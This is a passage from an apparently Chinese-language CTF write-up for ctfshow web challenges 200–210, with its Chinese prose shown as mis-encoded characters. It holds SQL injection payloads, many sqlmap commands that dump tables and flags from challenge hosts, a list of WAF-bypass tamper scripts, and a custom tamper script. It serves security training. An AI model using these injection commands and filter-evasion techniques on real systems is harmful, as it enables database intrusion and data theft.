aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­ä¸Šä¸€é¢˜çš„payload</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><h4 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h4><p>è¿›å…¥åˆ°å¯¹sqlmapçš„ä½¿ç”¨ï¼Œå…ˆæŸ¥è¯¢æ•°æ®åº“ï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®åº“ä¸ºctfshow_web</p><p>æŸ¥è¯¢è¡¨åï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¡¨åä¸ºctfshow_user</p><p>å†æŸ¥è¯¢å…¶ä¸­çš„åˆ—å</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ºidã€passã€username</p><p>å†æŸ¥è¯¢passåˆ—åé‡Œçš„å€¼</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h4><p>é¢˜ç›®æç¤ºä½¿ç”¨â€“dataå‚æ•°ï¼Œè€Œåœ¨sqlmapä¸­dataå‚æ•°æ˜¯ç”¨postä¼ å‚ï¼Œpayload;</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°æ•°æ®åº“ctfshow_web</p><p>å†æŸ¥è¯¢å…¶è¡¨åï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°è¡¨åï¼šctfshow_user</p><p>å†æŸ¥è¯¢å…¶å­—æ®µå</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¾æ—§æ˜¯idã€passã€usernameï¼š</p><p>å†æŸ¥è¯¢passä¸­çš„å†…å®¹</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h4><p>é¢˜ç›®æç¤ºä½¿ç”¨sqlmapçš„methodå‚æ•°æ”¹å˜è¯·æ±‚æ–¹å¼ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;540ec1b4-0662-4636-be0b-9f2ed1dfcf7e.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer &quot;http:&#x2F;&#x2F;540ec1b4-0662-4636-be0b-9f2ed1dfcf7e.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœ‹äº†wpæ‰çŸ¥é“æ˜¯ç”¨PUTæ–¹æ³•ï¼ŒåŒæ—¶è¿˜è¦åŠ ä¸ŠContent-Typeå¤´</p><h4 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h4><p>è¿™ä¸€æ¬¡æ˜¯è¦æ±‚ä½¿ç”¨cookieæäº¤æ•°æ®ï¼Œåªéœ€å†ä¸Šä¸€ä¸ªpayloadçš„åŸºç¡€ä¸ŠåŠ ä¸Šcookieå³å¯ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;26e63a8c-666f-4e3d-93d6-21f0b774dc4c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;65if5r3kiffkbnhap36d5k8dp4; ctfshow&#x3D;62f0ed3bf93a314fe099219183b4d75e&quot; --referer &quot;http:&#x2F;&#x2F;26e63a8c-666f-4e3d-93d6-21f0b774dc4c.challenge.ctf.show&#x2F;sqlmap.php; UM_distinctid&#x3D;17cd43de779426-013ac9f6834b2e-b7a1438-144000-17cd43de77a4a8&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h4><p>é¢˜ç›®æç¤ºéœ€è¦apié‰´æƒï¼Œä¸å¤ªæ˜ç™½ï¼Œå¯¹å…¶è¿›è¡ŒæŠ“åŒ…åï¼Œå‘ç°å¤šäº†ä¸€ä¸ªgetToken.phpæ•°æ®åŒ…ï¼Œè¯´æ˜æ¯æ¬¡æŸ¥è¯¢å‰ä¼šå…ˆè®¿é—®getToken.phpï¼Œè€Œsqlmapä¸­</p><pre class="line-numbers language-none"><code class="language-none">--safe-url æä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå»è®¿é—®ä¸€ä¸‹--safe-freq æä¾›ä¸€ä¸ªå®‰å…¨ä¸é”™è¯¯çš„è¿æ¥ï¼Œè®¾ç½®æ¯æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥payloadï¼š</p><p>æŸ¥è¡¨åï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸€æ¬¡å¤šäº†ä¸€ä¸ªè¡¨ctfshow_flaxï¼Œå…¶flagå¾ˆæœ‰å¯èƒ½åœ¨å…¶ä¸­</p><p>æŸ¥å­—æ®µï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flax --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°æœ‰flagxå­—æ®µï¼Œç›´æ¥æŸ¥é‡Œé¢çš„å†…å®¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flax -C flagx --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>é¢˜ç›®æç¤ºsqléœ€è¦é—­åˆï¼Œä½†sqlmapä¼šå¸®æˆ‘ä»¬é—­åˆï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;f21f2f30-0c19-4a01-9d49-a39eeb9d8905.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f21f2f30-0c19-4a01-9d49-a39eeb9d8905.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;f21f2f30-0c19-4a01-9d49-a39eeb9d8905.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flaxc -C flagv --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h4><p>é¢˜ç›®æç¤ºtamperå‚æ•°ï¼Œè€Œtamperå¯ä»¥å¼•å…¥ç”¨æˆ·è‡ªç¼–è¯‘è„šæœ¬æ¥ç»•è¿‡è¿‡æ»¤ã€é»‘åå•ã€é˜²ç«å¢™ç­‰</p><pre class="line-numbers language-none"><code class="language-none">ä¸¾ä¾‹å¦‚ä¸‹ï¼šapostrophemask.py ç”¨utf8ä»£æ›¿å¼•å·equaltolike.py MSSQL * SQLiteä¸­like ä»£æ›¿ç­‰å·greatest.py MySQLä¸­ç»•è¿‡è¿‡æ»¤â€™&gt;â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·space2hash.py ç©ºæ ¼æ›¿æ¢ä¸º#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦space2comment.py ç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼apostrophenullencode.py MySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQLç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·halfversionedmorekeywords.py å½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®ºspace2morehash.py MySQLä¸­ç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦appendnullbyte.p Microsoft Accessåœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç ifnull2ifisnull.py MySQLï¼ŒSQLite (possibly)ï¼ŒSAP MaxDBç»•è¿‡å¯¹ IFNULL è¿‡æ»¤space2mssqlblank.py mssqlç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å·base64encode.py ç”¨base64ç¼–ç space2mssqlhash.py mssqlæŸ¥è¯¢ä¸­æ›¿æ¢ç©ºæ ¼modsecurityversioned.py mysqlä¸­è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Šspace2mysqlblank.py mysqlä¸­ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·between.py MS SQL 2005ï¼ŒMySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0ä¸­ç”¨betweenæ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰space2mysqldash.py MySQLï¼ŒMSSQLæ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰multiplespaces.py å›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼space2plus.py ç”¨+æ›¿æ¢ç©ºæ ¼bluecoat.py MySQL 5.1, SGOSä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥ã€‚ ç„¶åæ›¿æ¢&#x3D;ä¸ºlikenonrecursivereplacement.py åŒé‡æŸ¥è¯¢è¯­å¥ã€‚å–ä»£predefined SQLå…³é”®å­—withè¡¨ç¤º suitable foræ›¿ä»£space2randomblank.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†sp_password.py è¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„26 æœ‰æ•ˆè½½è·çš„æœ«å°¾chardoubleencode.py åŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)unionalltounion.py æ›¿æ¢UNION ALL SELECT UNION SELECTcharencode.py Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0urlç¼–ç ï¼›randomcase.py Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0ä¸­éšæœºå¤§å°å†™unmagicquotes.py å®½å­—ç¬¦ç»•è¿‡ GPC addslashesrandomcomments.py ç”¨&#x2F;**&#x2F;åˆ†å‰²sqlå…³é”®å­—charunicodeencode.py ASPï¼ŒASP.NETä¸­å­—ç¬¦ä¸² unicode ç¼–ç securesphere.py è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13æ³¨é‡Šç»•è¿‡halfversionedmorekeywords.py MySQL &lt; 5.1ä¸­å…³é”®å­—å‰åŠ æ³¨é‡Š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œé¢˜ç›®åˆšå¥½è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨space2randomblank.py è„šæœ¬æ¥æ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;c53e197f-341c-43ce-aa55-ea91074fc730.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;c53e197f-341c-43ce-aa55-ea91074fc730.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment.py --referer &quot;http:&#x2F;&#x2F;c53e197f-341c-43ce-aa55-ea91074fc730.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è™½ç„¶å¯¹å°å†™çš„selectè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†sqlmapä¸­ä¸€èˆ¬éƒ½æ˜¯å¤§å†™çš„selectï¼Œç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;cac6878f-5807-4b8b-9133-de65af3dc9d5.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;cac6878f-5807-4b8b-9133-de65af3dc9d5.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment.py --referer &quot;http:&#x2F;&#x2F;cac6878f-5807-4b8b-9133-de65af3dc9d5.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤  function waf($str)&#123;   &#x2F;&#x2F;TODO æœªå®Œå·¥   return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡è¿‡æ»¤äº†ç©ºæ ¼ã€*å·ã€=å·ï¼Œä½†æˆ‘ä»¬å¯ä»¥è‡ªå·±æ”¹iè„šæœ¬ï¼Œå°†=æ¢æˆlikeï¼Œç©ºæ ¼æ¢æˆ0x9,</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;065b5d24-7ebf-4c8b-a9d8-ccf329caa2be.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;065b5d24-7ebf-4c8b-a9d8-ccf329caa2be.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web209.py --referer &quot;http:&#x2F;&#x2F;065b5d24-7ebf-4c8b-a9d8-ccf329caa2be.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbms &quot;mysql&quot; --threads 3 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¯´æ˜éœ€è¦å¯¹æ³¨å…¥çš„å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†</p><p>strrevï¼šè¿”å› <code>string</code> åè½¬åçš„å­—ç¬¦ä¸²ã€‚ </p><p>å³æˆ‘ä»¬åªéœ€è¦å…ˆbase64åŠ 